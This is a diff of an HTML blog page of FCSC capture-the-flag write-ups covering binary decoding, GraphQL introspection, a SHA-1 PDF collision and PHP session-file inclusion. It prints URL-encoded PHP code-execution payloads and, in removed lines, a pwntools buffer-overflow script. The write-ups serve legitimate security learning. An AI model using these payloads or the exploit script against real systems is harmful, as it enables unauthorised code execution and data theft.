+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">binary_str = <span style="color:#cd5555">&#34;&#34;</span>
+<span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(<span style="color:#cd5555">&#39;binary.txt&#39;</span>, <span style="color:#cd5555">&#39;r&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> binary_file:
+    binary_str += binary_file.read()
+
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">bitstring_to_bytes</span>(s):
+    <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">int</span>(s, <span style="color:#b452cd">2</span>).to_bytes(<span style="color:#658b00">len</span>(s) // <span style="color:#b452cd">8</span>, byteorder=<span style="color:#cd5555">&#39;big&#39;</span>)
+
+<span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(<span style="color:#cd5555">&#39;decoded&#39;</span>, <span style="color:#cd5555">&#39;wb&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> decoded_file:
+    decoded_file.write(bitstring_to_bytes(binary_str)[<span style="color:#b452cd">16</span>:])
+</code></pre></div><p>This makes an ELF binary file that we can execute after installing libssl1.0.0. The executable asks us a password to get access to the flag. Debugging the application we see that it computes the SHA-1 hash of the input and compares it to this sequence of bytes: <code>5823db976801c4a0e2d7a330b2bb82fe27cc2612</code>. Doing a reverse lookup, we find the password: <code>401445</code>. The flag is: <code>FCSC{401445}</code>.</p>
+<hr>
+<h1 id="web">Web</h1>
+<h2 id="rainbow-pages">Rainbow Pages</h2>
+<p>We are greeted with a website where we can search for chefs. We can guess that the application makes an SQL request with the <code>LIKE</code> statement.</p>
+<p>We make the search with the URL parameter <code>search</code>. If we trying seaching for the letter <code>a</code>, it performs the search with the following GET request:</p>
+<pre><code>GET /index.php?search=eyBhbGxDb29rcyAoZmlsdGVyOiB7IGZpcnN0bmFtZToge2xpa2U6ICIlYSUifX0pIHsgbm9kZXMgeyBmaXJzdG5hbWUsIGxhc3RuYW1lLCBzcGVjaWFsaXR5LCBwcmljZSB9fX0=
+</code></pre><p>Decoding the base64 string, we get:</p>
+<pre><code>{ allCooks (filter: { firstname: {like: &quot;%a%&quot;}}) { nodes { firstname, lastname, speciality, price }}}
+</code></pre><p>We see that the application uses GraphQL to make the requests. I ran an introspection query against the GraphQL endpoint that I got from <a href="https://apis.guru/graphql-voyager/">GraphQL Voyager</a> which gives us a nice little graph.</p>
+<p><img src="/images/fcsc/rainbow_pages.png" alt="Graph generated by GraphQL Voyager"></p>
+<p>The graph shows a flagById query. Let&rsquo;s try to get the flag with id 1:</p>
+<pre><code>{ flagById (id:1) {flag} }
+</code></pre><p>We base64 the query and make a get request:</p>
+<pre><code>GET /index.php?search=eyBmbGFnQnlJZCAoaWQ6MSkge2ZsYWd9IH0=
 ...
-monster|s:34:&quot;../../../var/log/apache/access.log&quot;;
-</code></pre><p>This was content of the last request I made to the server. We can execute arbitrary PHP commands by making a request to the command we want to execute URL-encoded and then requesting the session file, for example if we want to execute <code>phpinfo()</code>:</p>
-<pre><code>GET /index.php?monster=%3c%3f%3d%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e
-...
-GET /index.php?monster=sessions/sess\_{PHPSESSID}
-</code></pre><p>Will execute the function. Because the <code>include_once</code> has already been called with <code>flag.php</code>, we can execute the following to print all the variables:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#1e889b">&lt;?php</span> <span style="color:#00688b">$arr</span> = get_defined_vars();print_r(<span style="color:#00688b">$arr</span>); <span style="color:#1e889b">?&gt;</span>
-</code></pre></div><p>Let&rsquo;s try:</p>
-<pre><code>GET /index.php?monster=%3c%3f%70%68%70%20%24%61%72%72%20%3d%20%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%3b%70%72%69%6e%74%5f%72%28%24%61%72%72%29%3b%20%3f%3e
-...
-[flag] =&gt; FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}
-</code></pre><h1 id="enter-the-dungeon">Enter the dungeon</h1>
+{&quot;data&quot;:{&quot;flagById&quot;:{&quot;flag&quot;:&quot;FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}&quot;}}}
+</code></pre><p>We get the flag :)</p>
+<h2 id="enterthedungeon">EnterTheDungeon</h2>
 <p>We are greeted with a website that asks for a secret to access a dungeon. There is an HTML comment:</p>
 <div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#228b22">&lt;!-- Pour les admins : si vous pouvez valider les changements que j&#39;ai fait dans la page &#34;check_secret.php&#34;, le code est accessible sur le fichier &#34;check_secret.txt&#34; --&gt;</span>
 </code></pre></div><p>So we have access to the page that checks if the secret is valid:</p>
@@ -270,133 +456,90 @@ GET /index.php?monster=sessions/sess\_{PHPSESSID}
        /&gt; )&quot;__/ \___  &quot;  \__  _) \_ -\_.==___===/.&lt;  \__(\_ \
       /  __/ )___   &gt; \_ ) \  \_ &quot;  ).==_____==( &lt;.&quot;/ (_&lt;  \)|
      lc_/&gt;.=__.._\&quot;__\_  &gt;_)___\-_/.=________=/___/.__&gt;__&quot;(__/
-</code></pre><h1 id="infiltrate">Infiltrate</h1>
-<p>We are given an image with only black and white pixels that are supposed to represent the blinking light of an HDD, so my first guess is that it represented a file. I used dcode to parse the images to bits and then translate them to a bytearray with the following python script:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">binary_str = <span style="color:#cd5555">&#34;&#34;</span>
-<span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(<span style="color:#cd5555">&#39;binary.txt&#39;</span>, <span style="color:#cd5555">&#39;r&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> binary_file:
-    binary_str += binary_file.read()
-
-<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">bitstring_to_bytes</span>(s):
-    <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">int</span>(s, <span style="color:#b452cd">2</span>).to_bytes(<span style="color:#658b00">len</span>(s) // <span style="color:#b452cd">8</span>, byteorder=<span style="color:#cd5555">&#39;big&#39;</span>)
-
-<span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(<span style="color:#cd5555">&#39;decoded&#39;</span>, <span style="color:#cd5555">&#39;wb&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> decoded_file:
-    decoded_file.write(bitstring_to_bytes(binary_str)[<span style="color:#b452cd">16</span>:])
-</code></pre></div><p>This makes an ELF binary file that we can execute after installing libssl1.0.0. The executable asks us a password to get access to the flag. Debugging the application we see that it computes the SHA-1 hash of the input and compares it to this sequence of bytes: <code>5823db976801c4a0e2d7a330b2bb82fe27cc2612</code>. Doing a reverse lookup, we find the password: <code>401445</code>. The flag is: <code>FCSC{401445}</code>.</p>
-<h1 id="le-rat-conteur">Le rat conteur</h1>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl enc -aes-128-ctr -d -in flag.jpg.enc -out flag.jpg -K 00112233445566778899aabbccddeeff -iv <span style="color:#b452cd">0000000000000000</span>
-</code></pre></div><h1 id="poney">Poney</h1>
-<h2 id="file-information">File information</h2>
-<pre><code>poney: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06fdfc3c264bdc167a0855288210c06e16ce805e, not stripped
-</code></pre><h2 id="elf-info">ELF info</h2>
-<pre><code>ELF Header:
-  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
-  Class:                             ELF64
-  Data:                              2's complement, little endian
-  Version:                           1 (current)
-  OS/ABI:                            UNIX - System V
-  ABI Version:                       0
-  Type:                              EXEC (Executable file)
-  Machine:                           Advanced Micro Devices X86-64
-  Version:                           0x1
-  Entry point address:               0x400580
-  Start of program headers:          64 (bytes into file)
-  Start of section headers:          6616 (bytes into file)
-  Flags:                             0x0
-  Size of this header:               64 (bytes)
-  Size of program headers:           56 (bytes)
-  Number of program headers:         9
-  Size of section headers:           64 (bytes)
-  Number of section headers:         29
-  Section header string table index: 28
-
-Entry point address: 0x400580
-</code></pre><h2 id="elf-security">ELF security</h2>
-<pre><code>'/root/fcsc/poney/poney'
-Arch:     amd64-64-little
-RELRO:    Full RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-</code></pre><p>No execute is enabled.</p>
-<p>There is a <code>shell</code> function at adress <code>0x0000000000400676</code>. The main function uses function <code>scanf</code>. We can do a buffer overflow to execute the <code>shell</code> function:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">from</span> <span style="color:#008b45;text-decoration:underline">pwn</span> <span style="color:#8b008b;font-weight:bold">import</span> *
-
-shell_address=p64(<span style="color:#b452cd">0x0000000000400676</span>)
-<span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> <span style="color:#658b00">range</span>(<span style="color:#b452cd">0</span>, <span style="color:#b452cd">128</span>):
-	log.info(f<span style="color:#cd5555">&#34;Offset is {i}&#34;</span>)
-	binary=remote(<span style="color:#cd5555">&#34;challenges1.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#b452cd">4000</span>)
-	<span style="color:#8b008b;font-weight:bold">print</span>(binary.recvuntil(<span style="color:#cd5555">&#39;&gt;&gt;&gt;&#39;</span>))
-	binary.sendline(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;a&#39;</span>*i + shell_address)
-	binary.interactive()
-</code></pre></div><h1 id="rainbow-pages">Rainbow Pages</h1>
-<p>We are greeted with a website where we can search for chefs. We can guess that the application makes an SQL request with the <code>LIKE</code> statement.</p>
-<p>We make the search with the URL parameter <code>search</code>. If we trying seaching for the letter <code>a</code>, it performs the search with the following GET request:</p>
-<pre><code>GET /index.php?search=eyBhbGxDb29rcyAoZmlsdGVyOiB7IGZpcnN0bmFtZToge2xpa2U6ICIlYSUifX0pIHsgbm9kZXMgeyBmaXJzdG5hbWUsIGxhc3RuYW1lLCBzcGVjaWFsaXR5LCBwcmljZSB9fX0=
-</code></pre><p>Decoding the base64 string, we get:</p>
-<pre><code>{ allCooks (filter: { firstname: {like: &quot;%a%&quot;}}) { nodes { firstname, lastname, speciality, price }}}
-</code></pre><p>We see that the application uses GraphQL to make the requests. I ran an introspection query against the GraphQL endpoint that I got from <a href="https://apis.guru/graphql-voyager/">GraphQL Voyager</a> which gives us a nice little graph.</p>
-<p><img src="/images/fcsc/rainbow_pages.png" alt="Graph generated by GraphQL Voyager"></p>
-<p>The graph shows a flagById query. Let&rsquo;s try to get the flag with id 1:</p>
-<pre><code>{ flagById (id:1) {flag} }
-</code></pre><p>We base64 the query and make a get request:</p>
-<pre><code>GET /index.php?search=eyBmbGFnQnlJZCAoaWQ6MSkge2ZsYWd9IH0=
-...
-{&quot;data&quot;:{&quot;flagById&quot;:{&quot;flag&quot;:&quot;FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}&quot;}}}
-</code></pre><p>We get the flag :)</p>
-<h1 id="randomito">Randomito</h1>
-<p>We have the source file: it&rsquo;s a python2 script that uses the <code>input</code> function instead of the <code>raw_input</code> function. We are supposed to guess two random numbers that are stored in two variables <code>secret_a</code> and <code>secret_b</code>. We can supply those to the script and we get the flag:</p>
-<pre><code>[+] Generating a 128-bit random secret (a, b)
-[+] Done! Now, try go guess it!
-&gt;&gt;&gt; a = secret_a
-&gt;&gt;&gt; b = secret_b
-[-] Trying 6df3fb4a206cdf56a6a0422880e82044
-[+] Well done! Here is the flag: FCSC{4496d11d19db92ae53e0b9e9415d99d877ebeaeab99e9e875ac346c73e8aca77}
-</code></pre><h1 id="tartetatin">TarteTatin</h1>
-<p>Opening up the binary in ghidra, we see the main function disassembled as:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ulong <span style="color:#008b45">main</span>(<span style="color:#00688b;font-weight:bold">void</span>)
-
+</code></pre><h2 id="revision">Revision</h2>
+<p>We are greeted with a website where we can upload two files. We have access part of the source code. Reading it we understand that the website:</p>
+<ul>
+<li>computes the SHA-1 hash of both files</li>
+<li>checks if the computed hashes are in a database</li>
+<li>prints the flag if both files have the same hash</li>
+</ul>
+<p>Testing the application we find out that it only accepts pdf files.</p>
+<p>Doing a little bit of research, we find that <a href="https://shattered.it">SHA-1 is vulnerable to collision attacks</a> and that we can create two different pdf files with the same SHA-1 hash. Two example pdfs are included in the website.</p>
+<p>Uploading them to the application gives:</p>
+<pre><code>Un des documents existe déjà dans la base de données. Vous semblez être sur la bonne voie...
+</code></pre><p>Now we need to find out how to modify the pdfs so that they compute the same hashes without them being in the database. Reading a little bit more, the website shows how they leveraged the pdf format by including <a href="https://shattered.it/static/pdf_format.png">this picture</a>. We understand that the only thing we have to do is to append some bytes to both pdfs and the hashes will remain the same. Appending <code>0xdeadbeef</code> to both documents and uploading them gives us the flag:</p>
+<pre><code>Bravo, vous avez trouvé une collision sha1 pour le fichier &quot;a305abf22d2e1568b33cdfb15d8fc29a34e8be28&quot; : FCSC{8f95b0fc1a793e102a65bae9c473e9a3c2893cf083a539636b082605c40c00c1}
+</code></pre><h2 id="bestiary">Bestiary</h2>
+<p>We are greeted with a website that lets us see information about beasts. The information is retrieved by the URL parameter <code>monster</code>. Using the php wrap <code>filter</code> allows to get the source of the <code>index.php</code> file base64 encoded:</p>
+<pre><code>GET /index.php?monster=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre><p>When we decode the reponse we get:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#1e889b">&lt;?php</span>
+	session_save_path(<span style="color:#cd5555">&#34;./sessions/&#34;</span>);
+	session_start();
+	<span style="color:#8b008b;font-weight:bold">include_once</span>(<span style="color:#cd5555">&#39;flag.php&#39;</span>);
+<span style="color:#1e889b">?&gt;</span>
+&lt;<span style="color:#8b008b;font-weight:bold">html</span>&gt;
+&lt;<span style="color:#8b008b;font-weight:bold">head</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">title</span>&gt;Bestiary&lt;/<span style="color:#8b008b;font-weight:bold">title</span>&gt;
+&lt;/<span style="color:#8b008b;font-weight:bold">head</span>&gt;
+&lt;<span style="color:#8b008b;font-weight:bold">body</span> <span style="color:#658b00">style</span>=<span style="color:#cd5555">&#34;background-color:#3CB371;&#34;</span>&gt;
+&lt;<span style="color:#8b008b;font-weight:bold">center</span>&gt;&lt;<span style="color:#8b008b;font-weight:bold">h1</span>&gt;Bestiary&lt;/<span style="color:#8b008b;font-weight:bold">h1</span>&gt;&lt;/<span style="color:#8b008b;font-weight:bold">center</span>&gt;
+&lt;<span style="color:#8b008b;font-weight:bold">script</span>&gt;
+<span style="color:#8b008b;font-weight:bold">function</span> show()
 {
-  <span style="color:#00688b;font-weight:bold">int</span> iVar1;
-  <span style="color:#00688b;font-weight:bold">long</span> in_FS_OFFSET;
-  <span style="color:#00688b;font-weight:bold">char</span> local_38 [<span style="color:#b452cd">40</span>];
-  <span style="color:#00688b;font-weight:bold">long</span> local_10;
-  
-  local_10 = *(<span style="color:#00688b;font-weight:bold">long</span> *)(in_FS_OFFSET + <span style="color:#b452cd">0x28</span>);
-  fgets(local_38,<span style="color:#b452cd">0x20</span>,stdin);
-  transform(local_38);
-  iVar1 = memcmp(local_38,pass_enc,<span style="color:#b452cd">0x10</span>);
-  <span style="color:#8b008b;font-weight:bold">if</span> (iVar1 == <span style="color:#b452cd">0</span>) {
-    transform(flag_enc);
-    puts(flag_enc);
-  }
-  <span style="color:#8b008b;font-weight:bold">if</span> (local_10 == *(<span style="color:#00688b;font-weight:bold">long</span> *)(in_FS_OFFSET + <span style="color:#b452cd">0x28</span>)) {
-    <span style="color:#8b008b;font-weight:bold">return</span> (ulong)(iVar1 == <span style="color:#b452cd">0</span>);
-  }
-                    <span style="color:#228b22">/* WARNING: Subroutine does not return */</span>
-  __stack_chk_fail();
+	<span style="color:#8b008b;font-weight:bold">var</span> monster = <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#34;monster&#34;</span>).value;
+	<span style="color:#658b00">document</span>.location.href = <span style="color:#cd5555">&#34;index.php?monster=&#34;</span>+monster;
 }
-</code></pre></div><p>So our input is goes through a <code>transform</code> function before being compared to a <code>pass_enc</code> variable. The <code>transform</code> is disassembled as:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#00688b;font-weight:bold">void</span> <span style="color:#008b45">transform</span>(<span style="color:#00688b;font-weight:bold">char</span> *param_1) {
-  <span style="color:#00688b;font-weight:bold">char</span> *pcVar1;
-  <span style="color:#00688b;font-weight:bold">char</span> *local_10;
-  
-  local_10 = param_1;
-  <span style="color:#8b008b;font-weight:bold">do</span> {
-    pcVar1 = local_10 + <span style="color:#b452cd">1</span>;
-    *local_10 = *local_10 + <span style="color:#cd5555">&#39;\x01&#39;</span>;
-    local_10 = pcVar1;
-  } <span style="color:#8b008b;font-weight:bold">while</span> (*pcVar1 != <span style="color:#cd5555">&#39;\0&#39;</span>);
-  <span style="color:#8b008b;font-weight:bold">return</span>;
-}
-</code></pre></div><p>It&rsquo;s a simple function that adds 1 to the ASCII code of every char of the string in the parameters. Using gdb, we find that the <code>pass_enc</code> variable is equal to <code>NzTfdvs4Q4ttx1se\340\a\371\367\377\177</code>. Using a quick python script, we find the password:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pass_enc = <span style="color:#cd5555">&#34;NzTfdvs4Q4ttx1se</span><span style="color:#cd5555">\340\a\371\367\377\177</span><span style="color:#cd5555">&#34;</span>
-<span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> pass_enc:
-  <span style="color:#8b008b;font-weight:bold">print</span>(<span style="color:#658b00">chr</span>(<span style="color:#658b00">ord</span>(i)-<span style="color:#b452cd">1</span>), end=<span style="color:#cd5555">&#34;&#34;</span>)
+&lt;/<span style="color:#8b008b;font-weight:bold">script</span>&gt;
 
-MySecur3P3ssw0rdßøöþ~
-</code></pre></div><p>Running the script with the password we found gives us the flag:</p>
-<pre><code>Well done! The flag is:
-FCSC{83f41431c111062d003dd0213cf824d66f770a0be1305e2813f15dd76503a91d}
+&lt;<span style="color:#8b008b;font-weight:bold">p</span>&gt;
+<span style="color:#1e889b">&lt;?php</span>
+	<span style="color:#00688b">$monster</span> = <span style="color:#8b008b;font-weight:bold">NULL</span>;
+
+	<span style="color:#8b008b;font-weight:bold">if</span>(isset(<span style="color:#00688b">$_SESSION</span>[<span style="color:#cd5555">&#39;monster&#39;</span>]) &amp;&amp; !<span style="color:#8b008b;font-weight:bold">empty</span>(<span style="color:#00688b">$_SESSION</span>[<span style="color:#cd5555">&#39;monster&#39;</span>]))
+		<span style="color:#00688b">$monster</span> = <span style="color:#00688b">$_SESSION</span>[<span style="color:#cd5555">&#39;monster&#39;</span>];
+	<span style="color:#8b008b;font-weight:bold">if</span>(isset(<span style="color:#00688b">$_GET</span>[<span style="color:#cd5555">&#39;monster&#39;</span>]) &amp;&amp; !<span style="color:#8b008b;font-weight:bold">empty</span>(<span style="color:#00688b">$_GET</span>[<span style="color:#cd5555">&#39;monster&#39;</span>]))
+	{
+		<span style="color:#00688b">$monster</span> = <span style="color:#00688b">$_GET</span>[<span style="color:#cd5555">&#39;monster&#39;</span>];
+		<span style="color:#00688b">$_SESSION</span>[<span style="color:#cd5555">&#39;monster&#39;</span>] = <span style="color:#00688b">$monster</span>;
+	}
+
+	<span style="color:#8b008b;font-weight:bold">if</span>(<span style="color:#00688b">$monster</span> !== <span style="color:#8b008b;font-weight:bold">NULL</span> &amp;&amp; strpos(<span style="color:#00688b">$monster</span>, <span style="color:#cd5555">&#34;flag&#34;</span>) === <span style="color:#8b008b;font-weight:bold">False</span>)
+		<span style="color:#8b008b;font-weight:bold">include</span>(<span style="color:#00688b">$monster</span>);
+	<span style="color:#8b008b;font-weight:bold">else</span>
+		<span style="color:#8b008b;font-weight:bold">echo</span> <span style="color:#cd5555">&#34;Select a monster to read his description.&#34;</span>;
+<span style="color:#1e889b">?&gt;</span>
+&lt;/<span style="color:#8b008b;font-weight:bold">p</span>&gt;
+
+&lt;<span style="color:#8b008b;font-weight:bold">select</span> <span style="color:#658b00">id</span>=<span style="color:#cd5555">&#34;monster&#34;</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;beholder&#34;</span>&gt;Beholder&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;displacer_beast&#34;</span>&gt;Displacer Beast&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;mimic&#34;</span>&gt;Mimic&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;rust_monster&#34;</span>&gt;Rust Monster&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;gelatinous_cube&#34;</span>&gt;Gelatinous Cube&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;owlbear&#34;</span>&gt;Owlbear&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;lich&#34;</span>&gt;Lich&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;the_drow&#34;</span>&gt;The Drow&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;mind_flayer&#34;</span>&gt;Mind Flayer&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;tarrasque&#34;</span>&gt;Tarrasque&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
+&lt;/<span style="color:#8b008b;font-weight:bold">select</span>&gt; &lt;<span style="color:#8b008b;font-weight:bold">input</span> <span style="color:#658b00">type</span>=<span style="color:#cd5555">&#34;button&#34;</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;show description&#34;</span> <span style="color:#658b00">onclick</span>=<span style="color:#cd5555">&#34;show()&#34;</span>&gt;
+&lt;<span style="color:#8b008b;font-weight:bold">div</span> <span style="color:#658b00">style</span>=<span style="color:#cd5555">&#34;font-size:70%&#34;</span>&gt;Source : https://io9.gizmodo.com/the-10-most-memorable-dungeons-dragons-monsters-1326074030&lt;/<span style="color:#8b008b;font-weight:bold">div</span>&gt;&lt;<span style="color:#8b008b;font-weight:bold">br</span> /&gt;
+&lt;/<span style="color:#8b008b;font-weight:bold">body</span>&gt;
+&lt;/<span style="color:#8b008b;font-weight:bold">html</span>&gt;
+</code></pre></div><p>Sessions are stored in the sessions directory, so we can access it by requesting:</p>
+<pre><code>GET /index.php?monster=sessions/sess\_{PHPSESSID}
+...
+monster|s:34:&quot;../../../var/log/apache/access.log&quot;;
+</code></pre><p>This was content of the last request I made to the server. We can execute arbitrary PHP commands by making a request to the command we want to execute URL-encoded and then requesting the session file, for example if we want to execute <code>phpinfo()</code>:</p>
+<pre><code>GET /index.php?monster=%3c%3f%3d%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e
+...
+GET /index.php?monster=sessions/sess\_{PHPSESSID}
+</code></pre><p>Will execute the function. Because the <code>include_once</code> has already been called with <code>flag.php</code>, we can execute the following to print all the variables:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#1e889b">&lt;?php</span> <span style="color:#00688b">$arr</span> = get_defined_vars();print_r(<span style="color:#00688b">$arr</span>); <span style="color:#1e889b">?&gt;</span>
+</code></pre></div><p>Let&rsquo;s try:</p>
+<pre><code>GET /index.php?monster=%3c%3f%70%68%70%20%24%61%72%72%20%3d%20%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%3b%70%72%69%6e%74%5f%72%28%24%61%72%72%29%3b%20%3f%3e
+...
+[flag] =&gt; FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}
 </code></pre>
     <a href="/"> >> Home</a>
   </main>
